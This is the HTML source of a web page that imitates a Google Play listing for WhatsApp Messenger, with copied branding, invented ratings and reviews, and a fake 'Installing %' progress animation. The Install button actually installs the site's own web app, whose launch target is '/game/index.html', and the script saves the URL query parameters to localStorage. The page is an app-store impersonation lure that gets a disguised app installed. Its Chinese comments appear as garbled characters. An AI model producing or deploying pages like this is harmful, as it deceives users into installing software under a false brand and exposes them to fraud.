<!DOCTYPE html>
<html lang="zh">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>WhatsApp Messenger - Google Play</title>
    <link rel="stylesheet" href="index.css" />
    <!-- pwa -->
    <link rel="manifest" href="manifest.json" />
    <link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
  </head>
  <body>
    <header>
      <div class="container">
        <div class="header-content">
          <a href="#" class="logo">
            <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
              <path fill="none" d="M0,0h40v40H0V0z"></path>
              <g>
                <path
                  d="M19.7,19.2L4.3,35.3c0,0,0,0,0,0c0.5,1.7,2.1,3,4,3c0.8,0,1.5-0.2,2.1-0.6l0,0l17.4-9.9L19.7,19.2z"
                  fill="#EA4335"
                ></path>
                <path
                  d="M35.3,16.4L35.3,16.4l-7.5-4.3l-8.4,7.4l8.5,8.3l7.5-4.2c1.3-0.7,2.2-2.1,2.2-3.6C37.5,18.5,36.6,17.1,35.3,16.4z"
                  fill="#FBBC04"
                ></path>
                <path
                  d="M4.3,4.7C4.2,5,4.2,5.4,4.2,5.8v28.5c0,0.4,0,0.7,0.1,1.1l16-15.7L4.3,4.7z"
                  fill="#4285F4"
                ></path>
                <path
                  d="M19.8,20l8-7.9L10.5,2.3C9.9,1.9,9.1,1.7,8.3,1.7c-1.9,0-3.6,1.3-4,3c0,0,0,0,0,0L19.8,20z"
                  fill="#34A853"
                ></path>
              </g>
            </svg>
            <span>Google Play</span>
          </a>
          <nav class="main-nav">
            <ul>
              <li><a href="#" class="nav-link">Games</a></li>
              <li><a href="#" class="nav-link active">Apps</a></li>
              <li><a href="#" class="nav-link">Movies</a></li>
              <li><a href="#" class="nav-link">Books</a></li>
              <li><a href="#" class="nav-link">Kids</a></li>
            </ul>
          </nav>
          <div class="header-right">
            <svg
              class="search-icon"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"
                fill="currentColor"
              />
            </svg>
          </div>
        </div>
      </div>
    </header>

    <main class="container main-content">
      <section class="app-info">
        <div class="app-header">
          <div class="icon-wrapper">
            <img src="/pwa-192x192.png" alt="icon" class="app-icon" />
            <div class="circular-progress"></div>
          </div>
          <div class="app-details">
            <h1>WhatsApp Messenger</h1>
            <p class="app-developer">WhatsApp LLC</p>
            <div class="app-stats">
              <div class="stat-item">
                <div class="rating">4.4‚òÖ</div>
                <div class="subtitle">190M reviews</div>
              </div>
              <div class="stat-item">
                <div class="downloads">5B+</div>
                <div class="subtitle">downloads</div>
              </div>
              <div class="stat-item">
                <div class="age-rating">3+</div>
                <div class="subtitle">Ages 3+</div>
              </div>
            </div>
          </div>
        </div>

        <div class="action-buttons">
          <button class="install-btn">Install</button>
          <button class="share-btn">Share</button>
          <button class="wishlist-btn">Add to Wishlist</button>
        </div>

        <div class="compatibility">
          <span class="device-icon"></span>
          This app is available on your device
        </div>

        <div class="screenshots">
          <img src="/pwa-narrow-1.png" alt="Êà™Âõæ1" class="screenshot" />
          <img src="/pwa-narrow-2.png" alt="Êà™Âõæ2" class="screenshot" />
          <img src="/pwa-narrow-3.png" alt="Êà™Âõæ3" class="screenshot" />
          <img src="/pwa-narrow-4.png" alt="Êà™Âõæ4" class="screenshot" />
          <img src="/pwa-narrow-5.png" alt="Êà™Âõæ5" class="screenshot" />
        </div>
      </section>
      <!-- Â∫îÁî®ËØ¶ÊÉÖÂå∫Âüü -->
      <div class="app-details-section">
        <!-- ÂÖ≥‰∫éÊ≠§Â∫îÁî® -->
        <section class="detail-section">
          <h2 class="section-title">About this app <span class="arrow">‚Üí</span></h2>
          <div class="section-content">
            <p>
              WhatsApp from Meta is a secure and free messaging app with over 2 billion users. Operating in more than 180 countries and regions worldwide, it's reliable and simple, allowing you to stay connected with friends and family through text messages anytime, anywhere. WhatsApp seamlessly syncs between your phone and desktop computer, maintaining connectivity even when data connection is unstable.
            </p>
            <p>*The above content is for reference only.</p>

            <div class="version-info">
              <p>Updated on</p>
              <p>January 24, 2024</p>
            </div>
          </div>
        </section>

        <!-- Êï∞ÊçÆÂÆâÂÖ® -->
        <section class="detail-section">
          <h2 class="section-title">Data Security <span class="arrow">‚Üí</span></h2>
          <div class="section-content">
            <p>
              Security is about understanding how developers collect and use your data. Data privacy and security may vary by country or region. However, developers follow the same guidelines in how they may collect, share, or use your data.
            </p>

            <ul class="security-features">
              <li>
                <div class="feature-text">
                  <h3>No Data Sharing with Third Parties</h3>
                  <p>The developer states they do not share your data with other companies or organizations</p>
                </div>
              </li>
              <li>
                <div class="feature-text">
                  <h3>Encrypted Data Transfer</h3>
                  <p>Data is transmitted through secure connections and cannot be intercepted by others</p>
                </div>
              </li>
              <li>
                <div class="feature-text">
                  <h3>Data Can Be Deleted Anytime</h3>
                  <p>If you decide to stop using the app, you can request to delete your data</p>
                </div>
              </li>
            </ul>

            <button class="view-details-btn">View Details</button>
          </div>
        </section>

        <!-- ËØÑÂàÜÂíåËØÑ‰ª∑ -->
        <section class="detail-section reviews-section">
          <div class="section-header">
            <h2 class="section-title">
              Ratings and Reviews <span class="arrow">‚Üí</span>
            </h2>
            <span class="verified-badge">Ratings and reviews are verified</span>
          </div>

          <!-- Device Filters -->
          <div class="device-filters">
            <button class="device-btn active">
              <span class="device-icon">üì±</span>Phone
            </button>
            <button class="device-btn">
              <span class="device-icon">‚åö</span>Watch
            </button>
            <button class="device-btn">
              <span class="device-icon">üì∫</span>TV
            </button>
            <button class="device-btn">
              <span class="device-icon">üíª</span>Chromebook
            </button>
            <button class="device-btn">
              <span class="device-icon">üñ•Ô∏è</span>Tablet
            </button>
          </div>

          <!-- ËØÑÂàÜÊ¶ÇËßà -->
          <div class="rating-overview">
            <div class="rating-left">
              <div class="rating-big">4.4</div>
              <div class="rating-stars">‚òÖ‚òÖ¬Ω</div>
              <div class="rating-count">195 million reviews</div>
            </div>
            <div class="rating-bars">
              <div class="rating-bar-item">
                <span class="star-level">5</span>
                <div class="bar-container">
                  <div class="bar-fill" style="width: 85%"></div>
                </div>
              </div>
              <div class="rating-bar-item">
                <span class="star-level">4</span>
                <div class="bar-container">
                  <div class="bar-fill" style="width: 10%"></div>
                </div>
              </div>
              <div class="rating-bar-item">
                <span class="star-level">3</span>
                <div class="bar-container">
                  <div class="bar-fill" style="width: 3%"></div>
                </div>
              </div>
              <div class="rating-bar-item">
                <span class="star-level">2</span>
                <div class="bar-container">
                  <div class="bar-fill" style="width: 1%"></div>
                </div>
              </div>
              <div class="rating-bar-item">
                <span class="star-level">1</span>
                <div class="bar-container">
                  <div class="bar-fill" style="width: 5%"></div>
                </div>
              </div>
            </div>
          </div>

          <!-- ËØÑËÆ∫ÂàóË°® -->
          <div class="reviews-list">
            <!-- Review 1 -->
            <div class="review-item">
              <div class="review-avatar" style="background-color: #4285f4">
                j
              </div>
              <div class="review-content">
                <div class="review-header">
                  <h3>jun dai</h3>
                  <div class="review-rating">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                  <span class="review-date">October 29, 2024</span>
                </div>
                <p class="review-text">
                  Very good! The advantage is that every 1MB of data can support 5 minutes of internet calls directly, which saves more than half the data compared to Tencent WeChat. Another advantage is that both mobile and PC versions are power efficient. So I give it 5 stars! Hope to see data usage display for each call. However, after the upgrade the app became too bloated! Don't add games and unnecessary junk! Don't force upgrades!!! Also, file sending doesn't support various file types! 5-1=4, but improvements have been made since version 2.17.254. Additional update: giving back all 5 stars! For those who can't use it, please develop a login mode with phone numbers for users in blocked countries.
                </p>
                <div class="review-meta">
                  <span>124 people found this review helpful</span>
                </div>
              </div>
            </div>

            <!-- Review 2 -->
            <div class="review-item">
              <div class="review-avatar" style="background-color: #ea4335">
                j
              </div>
              <div class="review-content">
                <div class="review-header">
                  <h3>jess teoh</h3>
                  <div class="review-rating">‚òÖ‚òÖ</div>
                  <span class="review-date">September 27, 2024</span>
                </div>
                <p class="review-text">
                  Since the update, when recording conversations with friends at normal volume, the recorded audio is very faint with barely visible waveforms, and my voice is almost inaudible during playback. I have to shout and get very close to the microphone to get slightly better volume. However, phone calls and WeChat voice recordings work fine, so it's not an issue with my phone's mic. This problem only appeared after the two updates in 09/2024 - everything was working fine before. I've tried uninstalling and reinstalling but the recording volume issue persists. Is there a solution to this?
                </p>
                <div class="review-meta">
                  <span>132 people found this review helpful</span>
                </div>
              </div>
            </div>

            <!-- Review 3 -->
            <div class="review-item">
              <div class="review-avatar" style="background-color: #34a853">
                Êùé
              </div>
              <div class="review-content">
                <div class="review-header">
                  <h3>Li Ming</h3>
                  <div class="review-rating">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                  <span class="review-date">September 15, 2024</span>
                </div>
                <p class="review-text">
                  The user experience is excellent, with a clean and clear interface and comprehensive features. I particularly like the new privacy protection features, which are complete. The group management features are also very practical. Highly recommended!
                </p>
                <div class="review-meta">
                  <span>98 people found this review helpful</span>
                </div>
              </div>
            </div>
          </div>
        </section>

        <!-- Êñ∞ÂäüËÉΩ -->
        <section class="detail-section">
          <h2 class="section-title">What's New</h2>
          <div class="section-content">
            <ul class="new-features">
              <li>
                You can now find detailed information for 14 contacts in your address book, including their avatars.
              </li>
              <li>Improved sharing functionality both inside and outside of groups is now available.</li>
            </ul>
            <button class="view-details-btn">View More</button>
          </div>
        </section>
      </div>
    </main>

    <nav class="mobile-nav">
      <ul>
        <li><a href="#" class="nav-link">Games</a></li>
        <li><a href="#" class="nav-link active">Apps</a></li>
        <li><a href="#" class="nav-link">Movies</a></li>
        <li><a href="#" class="nav-link">Books</a></li>
        <li><a href="#" class="nav-link">Kids</a></li>
      </ul>
    </nav>
    <!-- Âú® body Êú´Â∞æÊ∑ªÂä†Ê®°ÊÄÅÊ°Ü -->
    <div id="qrModal" class="modal">
      <div class="modal-content">
        <span class="close">&times;</span>
        <h2>Install on Mobile</h2>
        <div id="qrcode">
          <div class="scan-line"></div>
        </div>
        <p>Please scan the QR code with your phone to install the app</p>
        <p style="color: #666; font-size: 14px; margin-top: 10px">
          Or visit the current URL in your mobile browser
        </p>
      </div>
    </div>

    <script>
      window.addEventListener("beforeinstallprompt", (event) => {
        console.log("beforeinstallprompt event fired");
        event.preventDefault();
        window.deferredPrompt = event;
        console.log("deferredPrompt saved:", window.deferredPrompt);
      });
      //   È°µÈù¢Âä†ËΩΩÂÆåÊàêÂêé
      window.onload = function () {
        // Ëé∑ÂèñÂΩìÂâç URL ÁöÑÊü•ËØ¢ÂèÇÊï∞
        const urlParams = new URLSearchParams(window.location.search);

        // Â∞ÜÂèÇÊï∞Â≠òÂÇ®Âà∞ localStorage
        localStorage.setItem("urlParams", urlParams.toString());
      };

      // Ê£ÄÊµãÊòØÂê¶‰∏∫ÁßªÂä®ËÆæÂ§á
      function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
          navigator.userAgent
        );
      }

      let installProgress = 0;
      let installationTimer;

      function updateInstallButton(progress) {
        const installBtn = document.querySelector(".install-btn");
        if (progress < 100) {
          installBtn.innerHTML = `
            <div class="progress-bar">
              <div class="progress" style="width: ${progress}%"></div>
              <span class="progress-text">Installing ${progress}%</span>
            </div>`;
          installBtn.style.padding = "0"; // Remove button padding
        } else {
          installBtn.innerHTML = "Launch App";
          installBtn.classList.add("launch-btn");
          installBtn.style.padding = ""; // Restore default button padding
          clearInterval(installationTimer);
        }
      }

      function updateAppIcon(isInstalling) {
        const appIcon = document.querySelector(".app-icon");
        const iconWrapper = appIcon.parentElement;

        if (!iconWrapper.classList.contains("icon-wrapper")) {
          // Â¶ÇÊûúÂõæÊ†áËøòÊ≤°ÊúâÂåÖË£ÖÂô®ÔºåÂàõÂª∫‰∏Ä‰∏™
          const wrapper = document.createElement("div");
          wrapper.className = "icon-wrapper";
          appIcon.parentNode.insertBefore(wrapper, appIcon);
          wrapper.appendChild(appIcon);

          // Ê∑ªÂä†ÂúÜÂΩ¢ËøõÂ∫¶Êù°ÂÖÉÁ¥†
          const progress = document.createElement("div");
          progress.className = "circular-progress";
          wrapper.appendChild(progress);
        }

        if (isInstalling) {
          appIcon.classList.add("installing");
          iconWrapper.classList.add("installing");
        } else {
          appIcon.classList.remove("installing");
          iconWrapper.classList.remove("installing");
        }
      }

      function simulateInstallProgress() {
        installProgress = 0;
        const installBtn = document.querySelector(".install-btn");
        installBtn.disabled = true;

        // ÂºÄÂßãÂõæÊ†áÂä®Áîª
        updateAppIcon(true);

        installationTimer = setInterval(() => {
          installProgress += 2;
          updateInstallButton(installProgress);
          if (installProgress >= 100) {
            clearInterval(installationTimer);
            installBtn.disabled = false;
            // ÁªìÊùüÂõæÊ†áÂä®Áîª
            updateAppIcon(false);
          }
        }, 400);
      }

      function download() {
        console.log("downloadButton clicked");
        console.log("Current deferredPrompt:", window.deferredPrompt);
        console.log("Is Mobile:", isMobile());

        if (!isMobile()) {
          // Âú®ÁîµËÑëÁ´ØÊòæÁ§∫‰∫åÁª¥Á†Å
          const modal = document.getElementById("qrModal");
          const qrcodeElement = document.getElementById("qrcode");
          qrcodeElement.innerHTML = ""; // Ê∏ÖÈô§‰πãÂâçÁöÑ‰∫åÁª¥Á†Å

          new QRCode(qrcodeElement, {
            text: window.location.href,
            width: 256,
            height: 256,
            colorDark: "#000000",
            colorLight: "#ffffff",
            correctLevel: QRCode.CorrectLevel.H,
          });

          modal.style.display = "block";
          return;
        }

        if (window.deferredPrompt) {
          console.log("Showing install prompt");
          window.deferredPrompt.prompt();
          window.deferredPrompt.userChoice.then((choiceResult) => {
            console.log("User choice result:", choiceResult);
            if (choiceResult.outcome === "accepted") {
              console.log("User accepted the install prompt");
              simulateInstallProgress();
            } else {
              console.log("User dismissed the install prompt");
              const installBtn = document.querySelector(".install-btn");
              installBtn.disabled = false;
              updateAppIcon(false);
            }
            window.deferredPrompt = null;
          });
        } else {
          console.log("deferredPrompt does not exist, check the following points:");
          console.log("1. Is the site accessed via HTTPS");
          console.log("2. Is manifest.json configured correctly");
          console.log("3. Is Service Worker registered");
          console.log("4. Is PWA already installed");

          // Ê£ÄÊü• Service Worker Ê≥®ÂÜåÁä∂ÊÄÅ
          if ("serviceWorker" in navigator) {
            navigator.serviceWorker.getRegistration().then((registration) => {
              console.log("Service Worker registration:", registration);
            });
          }

          // Â∞ùËØïÈôçÁ∫ßÊñπÊ°à
          const url = window.location.href.replace(/^https?:\/\//, "");
          console.log("Trying fallback with URL:", url);
          const intentUrl = `intent://${url}#Intent;scheme=https;package=com.android.chrome;end`;
          window.location.href = intentUrl;
        }
      }

      // ÂÖ≥Èó≠Ê®°ÊÄÅÊ°Ü
      document.querySelector(".close").onclick = function () {
        document.getElementById("qrModal").style.display = "none";
      };

      // ÁÇπÂáªÊ®°ÊÄÅÊ°ÜÂ§ñÈÉ®ÂÖ≥Èó≠
      window.onclick = function (event) {
        const modal = document.getElementById("qrModal");
        if (event.target == modal) {
          modal.style.display = "none";
        }
      };

      // ‰øÆÊîπÂêØÂä®Â∫îÁî®ÊåâÈíÆÁöÑÁÇπÂáªÂ§ÑÁêÜÂáΩÊï∞
      document
        .querySelector(".install-btn")
        .addEventListener("click", function () {
          if (this.classList.contains("launch-btn")) {
            // Â∞ùËØï‰ΩøÁî®‰∏çÂêåÊñπÂºèÂêØÂä®Â∫îÁî®
            launchApp();
          } else {
            download();
          }
        });

      // ‰øÆÊîπÂêØÂä®Â∫îÁî®ÁöÑÂáΩÊï∞
      async function launchApp() {
        // Get start_url defined in manifest
        const startUrl = "/game/index.html";

        // 1. First try using window.open with PWA launch parameters
        try {
          const pwaWindow = window.open(
            startUrl,
            "_blank", 
            "display=standalone,height=600,width=800"
          );
          if (pwaWindow) {
            return; // Return if window opens successfully
          }
        } catch (e) {
          console.log("PWA window.open failed:", e);
        }

        // 2. Try to get service worker registration of installed PWA
        try {
          const registration = await navigator.serviceWorker.ready;
          if (registration.active) {
            // Open via clients.openWindow
            const client = await registration.active.postMessage({
              type: "LAUNCH_PWA",
              url: startUrl,
            });
            return;
          }
        } catch (e) {
          console.log("Service Worker launch failed:", e);
        }

        // 3. Fallback: open in current window
        window.location.href = startUrl;
      }

      // Ê∑ªÂä† Service Worker Ê∂àÊÅØÂ§ÑÁêÜ
      if ("serviceWorker" in navigator) {
        navigator.serviceWorker.addEventListener("message", async (event) => {
          if (event.data.type === "LAUNCH_PWA") {
            try {
              const allClients = await clients.matchAll({
                type: "window",
                includeUncontrolled: true,
              });

              // Check if PWA window is already open
              for (const client of allClients) {
                if (client.url.includes(event.data.url)) {
                  // If window is found, activate it
                  client.focus();
                  return;
                }
              }

              // If no open window found, open a new one
              await clients.openWindow(event.data.url);
            } catch (e) {
              console.log("PWA launch failed:", e);
            }
          }
        });
      }

      // Listen for app install complete event
      window.addEventListener("appinstalled", (event) => {
        console.log("App installation complete");
        // Don't update button state immediately, let progress bar finish
        // If progress bar hasn't started, start simulating install progress
        if (installProgress === 0) {
          simulateInstallProgress();
        }
      });

      // Ê∑ªÂä† Service Worker Ê≥®ÂÜå‰ª£Á†Å
      if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
          navigator.serviceWorker
            .register("/sw.js")
            .then((registration) => {
              console.log("Service Worker registered:", registration);
            })
            .catch((error) => {
              console.log("Service Worker registration failed:", error);
            });
        });
      }
    </script>
  </body>
</html>
